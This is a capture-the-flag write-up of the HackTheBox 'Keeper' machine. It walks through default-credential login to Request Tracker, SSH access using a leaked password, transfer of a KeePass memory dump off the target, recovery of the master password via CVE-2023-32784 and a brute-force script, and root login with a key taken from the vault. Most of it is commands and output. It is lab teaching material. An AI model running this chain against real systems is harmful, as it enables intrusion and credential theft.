---
title: "[EN] - HackTheBox: Keeper Write-Up"
date: 2023-10-06 11:07:00 +0700
categories: [HackTheBox, Boxes, Easy, Linux]
tags: [Request Tracker, Ticketing service, Default credentials, CVE-2023-32784, Keepass]
description: Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With SSH access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the Keepass database, we can access the root SSH keys, which are used to gain a privileged shell on the host.
image: /assets/img/HTB-Keeper_banner.png
---

## Enumeration

As usual, we start with an Nmap port scan to identify the services running on the target host.

### Open TCP Ports

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Easy/Keeper]
└─$ nmap -sVC -p- -T4 -oN nmap/TCP_all_services.nmap 10.129.95.39
Starting Nmap <REDACTED> ( https://nmap.org ) at 2023-10-06 15:43 EDT
Nmap scan report for 10.129.95.39
Host is up (0.015s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds
```

As we can see, there aren't many ports open — only SSH and Nginx. Since SSH is rarely the attack surface in CTF machines, we focused our attention on the web service.

---

## Initial Access
  
Accessing port ``80`` in a browser, we were greeted with the following message :

![](/assets/img/HTB-Keeper_1.png)  

The message indicated that we needed to add a subdomain to our `/etc/hosts` file in order to resolve it properly.
  
```shell
 ┌──(kali㉿kali)-[~/…/HTB/Machines/Easy/Keeper]
└─$ cat /etc/hosts      
127.0.0.1	localhost
127.0.1.1	kali
10.129.95.39 tickets.keeper.htb  keeper.htb

┌──(kali㉿kali)-[~/…/HTB/Machines/Easy/Keeper]
└─$ ping -c 1 keeper.htb   
PING tickets.keeper.htb (10.129.95.39) 56(84) bytes of data.
64 bytes from tickets.keeper.htb (10.129.95.39): icmp_seq=1 ttl=63 time=12.6 ms

--- tickets.keeper.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 12.115/12.542/12.869/0.316 ms

┌──(kali㉿kali)-[~/…/HTB/Machines/Easy/Keeper]
└─$ ping -c 1 tickets.keeper.htb
PING tickets.keeper.htb (10.129.95.39) 56(84) bytes of data.
64 bytes from tickets.keeper.htb (10.129.95.39): icmp_seq=1 ttl=63 time=15.6 ms

--- tickets.keeper.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 13.332/16.727/21.241/3.324 ms
```
  
With `tickets.keeper.htb` now resolving correctly, we accessed the page to see what it had to offer :
  
![](/assets/img/HTB-Keeper_2.png)
  
This turned out to be the login page of Request Tracker (RT), an issue-tracking application used for bug tracking, help desk ticketing, customer service, workflow management, and more. Since we didn't have any credentials to log in with, we searched online for the application's default credentials and found `root:password`.
  
Using these default credentials, we successfully authenticated as `root`.
  
![](/assets/img/HTB-Keeper_3.png)
  
Since this is a ticketing application, we browsed through the open and closed tickets under `Search` → `Tickets` → `Recently viewed`, where we found an interesting ticket opened by `Lise Nørgaard`.

![](/assets/img/HTB-Keeper_4.png)
  
In the ticket, she mentioned a crash dump of her KeePass program and asked the support team for assistance.
  
Further enumeration under `Admin` → `Users` allowed us to identify a password that had been set by the support team for the user `Lise`.
  
![](/assets/img/HTB-Keeper_5.png)
![](/assets/img/HTB-Keeper_6.png)
  
We tried this password against SSH using Lise's username and successfully logged in :
  
```shell
┌──(kali㉿kali)-[~/…/Machines/Easy/Keeper]
└─$ ssh lnorgaard@10.129.95.39                                                                       
lnorgaard@10.129.95.39's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
You have mail.
Last login: Fri Oct  6 22:33:42 2023 from 10.10.16.16
lnorgaard@keeper:~$ whoami
lnorgaard
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
lnorgaard@keeper:~$ cat user.txt 
d4a1XXXXXXXXXXXXXXXXXXXXXX9bd436
```

---

## Privilege Escalation
  
Now that we had a foothold, we recalled that Lise had mentioned a KeePass issue when addressing the support team, and that she said she had stored the KeePass dump in her home folder.
  
```shell
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ unzip RT30000.zip 
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt
```
  
Now we needed to find a way to read the dump file. A quick search led us to [**CVE-2023-32784**](https://nvd.nist.gov/vuln/detail/CVE-2023-32784), a vulnerability affecting KeePass.
  
In order to read the dump file and extract the KeePass master key, we needed to install the `KeePass 2.X Master Password Dumper` tool along with the ``.NET 7 runtime``.
  
```shell
┌──(kali㉿kali)-[/opt]
└─$ wget https://packages.microsoft.com/config/debian/11/packages-microsoft-prod.deb -O packages-microsoft-prod.deb

┌──(kali㉿kali)-[/opt]
└─$ sudo dpkg -i packages-microsoft-prod.deb

┌──(kali㉿kali)-[/opt]
└─$ sudo apt-get update && sudo apt-get install -y dotnet-sdk-7.0

┌──(kali㉿kali)-[~/…/Machines/Easy/Keeper/privEsc]
└─$ sudo git clone https://github.com/vdohney/keepass-password-dumper
Cloning into 'keepass-password-dumper'...
remote: Enumerating objects: 111, done.
remote: Counting objects: 100% (111/111), done.
remote: Compressing objects: 100% (79/79), done.
remote: Total 111 (delta 61), reused 67 (delta 28), pack-reused 0
Receiving objects: 100% (111/111), 200.08 KiB | 5.88 MiB/s, done.
Resolving deltas: 100% (61/61), done.
```
  
Before running the tool, we needed to transfer both `KeePassDumpFull.dmp` and `passcodes.kdbx` to our attacking machine.

```shell
lnorgaard@keeper:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
  
```shell
┌──(kali㉿kali)-[~/…/Easy/Keeper/privEsc]
└─$ wget http://10.129.95.39:8000/KeePassDumpFull.dmp                                                                           
--2023-10-06 19:58:14--  http://10.129.95.39:8000/KeePassDumpFull.dmp
Connecting to 10.129.95.39:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 253395188 (242M) [application/vnd.tcpdump.pcap]
Saving to: ‘KeePassDumpFull.dmp'
KeePassDumpFull.dmp                     100%[============================================================================>] 241.66M  49.5MB/s    in 5.7s    
2023-10-06 19:58:20 (42.2 MB/s) - ‘KeePassDumpFull.dmp' saved [253395188/253395188]

┌──(kali㉿kali)-[~/…/Easy/Keeper/privEsc]
└─$ wget http://10.129.95.39:8000/passcodes.kdbx     
--2023-10-06 19:58:29--  http://10.129.95.39:8000/passcodes.kdbx
Connecting to 10.129.95.39:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3630 (3.5K) [application/octet-stream]
Saving to: ‘passcodes.kdbx'
passcodes.kdbx                          100%[============================================================================>]   3.54K  --.-KB/s    in 0s      
2023-10-06 19:58:29 (301 MB/s) - ‘passcodes.kdbx' saved [3630/3630]
```
  
Next, we ran the `keepass master dumper` tool against the `KeePassDumpFull.dmp` file :
  
```shell
┌──(kali㉿kali)-[~/…/Easy/Keeper/privEsc/keepass-password-dumper]
└─$ sudo dotnet run KeePassDumpFull.dmp 
Welcome to .NET 7.0!
---------------------
SDK Version: 7.0.401
Telemetry
---------

<SNIP>

Found: ●ø
Found: ●ø

<SNIP>

Found: ●c
Found: ●M
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:	●
2.:	ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
3.:	d, 
4.:	g, 
5.:	r, 
6.:	ø, 
7.:	d, 
8.:	 , 
9.:	m, 
10.:	e, 
11.:	d, 
12.:	 , 
13.:	f, 
14.:	l, 
15.:	ø, 
16.:	d, 
17.:	e, 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```
  
Now that we had recovered most of the KeePass master password, we still needed to determine its **first** and **second** characters.
Based on the output from the `keepass master dumper` tool, we wrote a quick bash script to brute-force the missing characters, which amounted to 390 possible combinations :
  
```bash
#!/bin/sh
first_char="0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v w y x z"
second_char="ø Ï l \` - ' ] § A I : = _ c M"
for char1 in $first_char; do
    for char2 in $second_char; do
        echo "Using password: \"${char1}${char2}dgrød med fløde\""
        echo "${char1}${char2}dgrød med fløde" | kpcli --kdb=$1 && exit 0
    done
done
```

Running the script, we successfully retrieved the KeePass master password :

```shell
┌──(kali㉿kali)-[~/…/Machines/Easy/Keeper/privEsc]
└─$ ./masterkey_crack.sh passcodes.kdbx
Using password: "0ødgrød med fløde"
Provide the master password: *************************
Couldn't load the file passcodes.kdbx
Error(s) from File::KeePass:
The database key appears invalid or else the database is corrupt.
Using password: "0Ïdgrød med fløde"
Provide the master password: *************************
Couldn't load the file passcodes.kdbx

<SNIP>

Using password: "røXXXXX XXX XXøde"
Provide the master password: *************************
KeePass CLI (kpcli) <REDACTED> is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.
kpcli:/> 
```

The KeePass master password turned out to be `røXXXXX XXX XXøde`. After opening the database with it, we began enumerating its contents for interesting credentials :
  
```shell
kpcli:/> ls
=== Groups ===
passcodes/
kpcli:/> cd passcodes/
kpcli:/passcodes> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
kpcli:/> ls passcodes/Network/
=== Entries ===
0. keeper.htb (Ticketing Server)                                          
1. Ticketing System
kpcli:/> show passcodes/Network/keeper.htb\ (Ticketing\ Server) 
 Path: /passcodes/Network/
Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4XXXXXXX!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY

       <SNIP>

       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
  
As we can see, the entry contained a PuTTY user key file for the root user. We saved this key into a new file so that we could convert it to OpenSSH format :
  
```shell
┌──(kali㉿kali)-[~/…/Machines/Easy/Keeper/privEsc]
└─$ cat root-id_rsa.ppk      
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY

<SNIP>

NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
  
We then proceeded to convert the key to OpenSSH format :
  
```shell
┌──(kali㉿kali)-[~/…/Machines/Easy/Keeper/privEsc]
└─$ puttygen root-id_rsa.ppk -O private-openssh -o id_rsa

┌──(kali㉿kali)-[~/…/Machines/Easy/Keeper/privEsc]
└─$ cat id_rsa          
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf
Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n

<SNIP>

qun2gwBfWeznoZaNULe6Khq/HFS2zk/Gi6qm3GsfZ0ihOu5+yOc636Bspy82JHd3
BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL
-----END RSA PRIVATE KEY-----
```
  
With the key properly formatted, all that remained was to set the correct permissions on it and authenticate as root to retrieve the root flag :
  
```shell
┌──(kali㉿kali)-[~/…/Machines/Easy/Keeper/privEsc]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/…/Machines/Easy/Keeper/privEsc]
└─$ ssh -i id_rsa root@10.129.95.39
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
You have new mail.
Last login: Mon Aug  7 19:00:06 2023 from 10.10.14.41
root@keeper:~# whoami
root
root@keeper:~# cat root.txt 
92a6XXXXXXXXXXXXXXXXXXXXXXa778dc
```

---

## Resources

- [https://wiki.gentoo.org/wiki/Request_Tracker](https://wiki.gentoo.org/wiki/Request_Tracker#:~:text=--action)
- [https://nvd.nist.gov/vuln/detail/cve-2023-32784](https://nvd.nist.gov/vuln/detail/cve-2023-32784)